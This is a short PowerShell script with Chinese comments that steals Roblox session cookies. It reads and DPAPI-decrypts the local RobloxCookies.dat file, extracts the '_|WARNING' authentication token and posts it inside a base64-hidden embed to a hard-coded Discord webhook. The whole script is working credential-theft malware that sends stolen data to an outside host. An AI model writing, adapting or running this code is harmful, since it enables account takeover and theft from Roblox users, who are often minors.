$OutputEncoding = [System.Text.Encoding]::UTF8

# 1. 定義路徑與 Webhook URL
$p = "$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"
$uri = "https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"

# 2. 檢查檔案是否存在
if (Test-Path $p) {
    try {
        # 取得並解密 Cookie
        [void][Reflection.Assembly]::LoadWithPartialName('System.Security')
        $j = (Get-Content $p -Raw | ConvertFrom-Json).CookiesData
        $d = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j), $null, 'CurrentUser')
        $s = [Text.Encoding]::UTF8.GetString($d)

        if ($s -match '(_\|WARNING.*?)(;|$)') {
            $cookie = $matches[1]

            # 3. 準備發送資料
            # Base64 內容：{"title": "接收到新的robux cookie", ...}
            $embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
            $decodedJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embedBase64))
            
            # 替換變數並轉換為物件
            $finalJson = $decodedJson.Replace('$cookie', $cookie)
            $embed = $finalJson | ConvertFrom-Json

            $payload = @{
                embeds = @($embed)
            }

            # 4. 發送 Webhook
            Invoke-RestMethod -Uri $uri -Method Post `
                -Body ($payload | ConvertTo-Json -Depth 10) `
                -ContentType "application/json; charset=utf-8"
        }
    }
    catch {
        Write-Error "處理過程中發生錯誤: $_"
    }
}
else {
    Write-Host "找不到 Roblox 設定檔，程序終止。"
}
